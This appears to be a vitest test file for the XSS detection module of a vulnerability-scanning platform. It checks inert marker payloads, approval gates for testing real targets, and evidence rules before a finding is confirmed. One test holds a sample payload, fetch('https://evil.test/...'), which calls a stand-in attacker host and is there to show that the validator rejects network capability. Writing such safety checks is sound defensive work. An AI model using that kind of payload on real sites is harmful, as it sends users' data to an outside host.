import { randomBytes, randomUUID } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import type { Candidate, IdentityRecord, InventoryEndpoint } from '@agentgo/contracts'
import { assertInertXssPayload, buildInertXssMarkerPayload } from '@agentgo/domain'
import {
  compileLegacyParityPlan,
  type LegacyParityCompileInput
} from './legacy-parity-adapters'
import {
  assessXss,
  assessXssDomOffline,
  assessXssStored,
  type BrowserObservation,
  type HttpObservation
} from './validation-engine'
import { XSS_V2_TECHNIQUE_IDS } from './vulnerability-bundles'
import { createVulnerabilityPlatform } from './vulnerability-platform'

const endpointId = randomUUID()
const parameterId = randomUUID()
const identityId = randomUUID()

function candidate(techniqueId: string): Candidate {
  return {
    candidateId: randomUUID(),
    familyId: 'xss',
    techniqueId,
    moduleVersion: '1.1.0',
    subjectRefs: [{ kind: 'endpoint', id: endpointId }],
    variantRefs: [],
    dependencyRefs: [],
    identityRefs: [],
    testObjectRefs: [],
    matrixRefs: [],
    parameterId,
    reason: 'XSS V2 module candidate.',
    expectedSignal: techniqueId,
    suggestedStrategy: 'xss.legacy.strategy'
  }
}

function identity(): IdentityRecord {
  return {
    id: identityId,
    targetId: randomUUID(),
    label: 'test',
    role: 'member',
    authType: 'bearer',
    isTestIdentity: true,
    ownedResourceIds: [],
    createdAt: '2026-09-02T00:00:00.000Z',
    updatedAt: '2026-09-02T00:00:00.000Z'
  }
}

function endpoint(
  url: string,
  name: string,
  location: InventoryEndpoint['parameters'][number]['location'] = 'query'
): InventoryEndpoint {
  return {
    id: endpointId,
    method: location === 'form' || location === 'json' ? 'POST' : 'GET',
    url,
    source: 'link',
    parameters: [
      {
        id: parameterId,
        name,
        location,
        required: true
      }
    ]
  }
}

function input(
  techniqueId: string,
  url: string,
  name: string,
  location: InventoryEndpoint['parameters'][number]['location'] = 'query',
  extras: Partial<LegacyParityCompileInput> = {}
): LegacyParityCompileInput {
  return {
    scanId: randomUUID(),
    candidate: candidate(techniqueId),
    endpoint: endpoint(url, name, location),
    identities: [identity()],
    allowedIdentityIds: [identityId],
    environment: 'attested-fixture',
    upsertReadInventory: async () => {
      throw new Error('XSS V2 tests must not perform a second I/O path.')
    },
    ...extras
  }
}

function http(body: string, headers: Record<string, string> = {}): HttpObservation {
  return {
    result: {
      status: 'succeeded',
      statusCode: 200,
      responseBody: Buffer.from(body),
      responseBodySha256: 'cd'.repeat(32),
      responseBytes: Buffer.byteLength(body),
      durationMs: 10,
      responseHeaders: { 'content-type': 'text/html', ...headers }
    },
    evidenceRefs: [],
    toolCallId: randomUUID(),
    proposalId: randomUUID(),
    policyDecisionId: randomUUID()
  }
}

function browser(
  marker: string,
  extras: { executed?: boolean; reviewable?: boolean } = {}
): BrowserObservation {
  return {
    result: {
      requestId: randomUUID(),
      status: 'succeeded',
      finalUrl: 'https://fixture.agentgo.test/search',
      links: [],
      forms: [],
      domSnapshot: `<html data-agentgo-xss="${marker}"></html>`,
      markerExecuted: extras.executed ?? true,
      screenshot: new Uint8Array([1]),
      networkRequestsBlocked: 0,
      resultBytes: 32,
      durationMs: 1
    },
    evidenceRefs: [],
    toolCallId: randomUUID(),
    proposalId: randomUUID(),
    policyDecisionId: randomUUID(),
    ...(extras.reviewable ? { reviewableDomOrScreenshotEvidence: true } : {})
  }
}

describe('XSS V2 reference module', () => {
  it('maps plan name xss.reflected-marker to the qualified inert-marker technique', () => {
    const platform = createVulnerabilityPlatform()
    const bundle = platform.definitionRegistry.getBundle('xss.legacy-v1', '1.2.0')
    const techniques = bundle?.bundle.manifest.techniques ?? []
    expect(techniques.map((item) => item.techniqueId)).toEqual([
      XSS_V2_TECHNIQUE_IDS.reflectedInertMarker,
      XSS_V2_TECHNIQUE_IDS.domOfflineReplay,
      XSS_V2_TECHNIQUE_IDS.storedTestObject
    ])
    expect(techniques[0]?.techniqueId).toBe('xss.reflected-inert-marker')
    expect(techniques[0]?.description).toContain('xss.reflected-marker')
    expect(techniques[1]?.allowedEnvironments).toEqual([
      'attested-fixture',
      'authorized-test-environment'
    ])
    expect(techniques[2]?.declaredMode).toBe('active-l2')
    const stored = bundle?.bundle.strategies.find(
      (item) => item.techniqueId === XSS_V2_TECHNIQUE_IDS.storedTestObject
    )
    expect(stored).toMatchObject({
      requiresTestObject: true,
      requiresSideEffectEnvelope: true,
      requiresCleanup: true,
      requiresCleanupVerification: true
    })
    expect(bundle?.bundle.remediations[0]?.remediation).toContain('Trusted Types')
  })

  it('compiles reflected marker, encoded negative, and L2/DOM gates', async () => {
    const reflected = await compileLegacyParityPlan(
      input(
        XSS_V2_TECHNIQUE_IDS.reflectedInertMarker,
        'https://fixture.agentgo.test/research/xss/html/positive?q=hello',
        'q'
      )
    )
    expect(reflected.kind).toBe('plan')
    if (reflected.kind === 'plan') {
      expect(reflected.draft.steps.map((step) => step.stepId)).toEqual([
        'xss.baseline',
        'xss.reflection',
        'xss.offline-verify',
        'xss.encoded-negative'
      ])
      const test = reflected.draft.steps.find((step) => step.stepId === 'xss.reflection')
      expect(test && 'mutationValue' in test ? test.mutationValue : '').toContain(
        'data-agentgo-marker'
      )
      expect(() =>
        assertInertXssPayload(
          test && 'mutationValue' in test ? String(test.mutationValue) : ''
        )
      ).not.toThrow()
    }

    const storedProduct = await compileLegacyParityPlan(
      input(
        XSS_V2_TECHNIQUE_IDS.storedTestObject,
        'https://fixture.agentgo.test/research/xss/stored/positive',
        'comment',
        'form',
        { environment: 'authorized-real-target' }
      )
    )
    expect(storedProduct).toMatchObject({ kind: 'awaiting-user', waitFor: 'approval' })

    const storedFixture = await compileLegacyParityPlan(
      input(
        XSS_V2_TECHNIQUE_IDS.storedTestObject,
        'https://fixture.agentgo.test/research/xss/stored/positive',
        'comment',
        'form'
      )
    )
    expect(storedFixture.kind).toBe('plan')
    if (storedFixture.kind === 'plan') {
      expect(storedFixture.draft.steps.map((step) => step.stepId)).toEqual([
        'xss.stored.pre-read',
        'xss.stored.isolated-read',
        'xss.stored.offline-verify'
      ])
    }

    const liveDom = await compileLegacyParityPlan(
      input(
        XSS_V2_TECHNIQUE_IDS.domOfflineReplay,
        'https://fixture.agentgo.test/research/xss/dom/positive',
        'hash',
        'query',
        { environment: 'authorized-real-target' }
      )
    )
    expect(liveDom).toMatchObject({ kind: 'awaiting-user', waitFor: 'input' })

    const fixtureDom = await compileLegacyParityPlan(
      input(
        XSS_V2_TECHNIQUE_IDS.domOfflineReplay,
        'https://fixture.agentgo.test/research/xss/dom/positive',
        'hash'
      )
    )
    expect(fixtureDom.kind).toBe('plan')
  })

  it('keeps the Day15 HTML proof payload and rejects network or storage capability', () => {
    const value = `agx_${randomBytes(16).toString('hex')}`
    const payload = buildInertXssMarkerPayload(value)
    expect(payload).toContain(`data-agentgo-marker="${value}"`)
    expect(payload).toContain("setAttribute('data-agentgo-xss'")
    expect(() => assertInertXssPayload(payload)).not.toThrow()
    expect(() => assertInertXssPayload(`fetch('https://evil.test/${value}')`)).toThrow(
      /network, storage, cookie/
    )
    expect(buildInertXssMarkerPayload(value, 'dom')).toBe(`#${value}`)
  })

  it('does not confirm XSS from hash-only or unapproved stored objects', () => {
    const value = `agx_${randomBytes(16).toString('hex')}`
    const payload = buildInertXssMarkerPayload(value)
    const executedHashOnly = assessXss({
      marker: value,
      http: http(`Search: ${payload}`),
      browser: browser(value)
    })
    expect(executedHashOnly.verdict).toBe('inconclusive')
    expect(executedHashOnly.missingChecks).toContain(
      'reviewable-dom-or-screenshot-evidence'
    )

    const stored = assessXssStored({
      marker: value,
      http: http(`Search: ${payload}`),
      browser: browser(value, { reviewable: true }),
      approved: false,
      cleanupVerified: false
    })
    expect(stored.verdict).toBe('inconclusive')
    expect(stored.failedChecks).toContain('l2-test-object-approved')

    const csp = assessXssDomOffline({
      marker: value,
      http: http(`Search: ${payload}`, {
        'content-security-policy': "default-src 'none'"
      }),
      browser: browser(value, { executed: false }),
      frozenSource: true
    })
    expect(csp.verdict).toBe('inconclusive')
    expect(csp.explanation).toContain('CSP')
  })
})
